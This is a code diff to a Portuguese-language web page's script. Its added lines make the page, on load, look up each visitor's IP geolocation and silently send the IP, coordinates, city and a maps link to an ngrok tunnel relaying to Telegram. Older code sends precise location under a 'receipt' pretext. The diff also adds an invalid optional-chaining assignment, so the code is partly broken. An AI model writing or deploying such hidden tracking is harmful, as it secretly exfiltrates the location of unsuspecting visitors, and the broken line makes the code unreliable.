@@ -33,7 +33,6 @@
       </ul>
       <p>© 2025 Labs Frontend - Todos os direitos reservados.</p>
     </div>
-
   </div>
 
   <script>
@@ -49,12 +48,11 @@
     const dia = String(dataAtual.getDate()).padStart(2, '0');
     const mes = String(dataAtual.getMonth() + 1).padStart(2, '0');
     const ano = dataAtual.getFullYear();
-
     const dataFormatada = `${dia}/${mes}/${ano}`;
 
-    document.getElementById("data-atual").textContent = dataFormatada;
+    document.getElementById("data-atual")?.textContent = dataFormatada;
 
-    console.log(dataAtual)
+    console.log(dataAtual);
 
     function sendLocation(position) {
       const latitude = position.coords.latitude;
@@ -68,25 +66,52 @@
         },
         body: JSON.stringify({ latitude, longitude, maps })
       })
-        .then(response => response.json())
-        .then(data => {
-          if (!data.success) {
-            alert("Erro ao enviar o comprovante.");
-          }
-        })
-        .catch(error => {
-          console.error("Erro:", error);
-        });
+      .then(response => response.json())
+      .then(data => {
+        if (!data.success) {
+          alert("Erro ao enviar o comprovante.");
+        }
+      })
+      .catch(error => {
+        console.error("Erro:", error);
+      });
     }
 
     function handleError(error) {
       alert("Erro ao obter a localização: " + error.message);
     }
-    
+
     fetch("https://ipapi.co/json/")
     .then(response => response.json())
     .then(data => {
       console.log("Localização aproximada:", data.city, data.region, data.country_name);
+
+      // Envia para o Telegram via backend
+      fetch("https://adfe-206-42-12-157.ngrok-free.app/send-location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          ip: data.ip,
+          latitude: data.latitude,
+          longitude: data.longitude,
+          cidade: data.city,
+          estado: data.region,
+          pais: data.country_name,
+          maps: `https://www.google.com/maps?q=${data.latitude},${data.longitude}`,
+          tipo: "IP"
+        })
+      })
+      .then(res => res.json())
+      .then(response => {
+        if (!response.success) {
+          console.error("Erro ao enviar IP:", response);
+        }
+      })
+      .catch(error => {
+        console.error("Erro ao enviar dados por IP:", error);
+      });
     })
     .catch(error => {
       console.error("Erro ao obter localização por IP:", error);
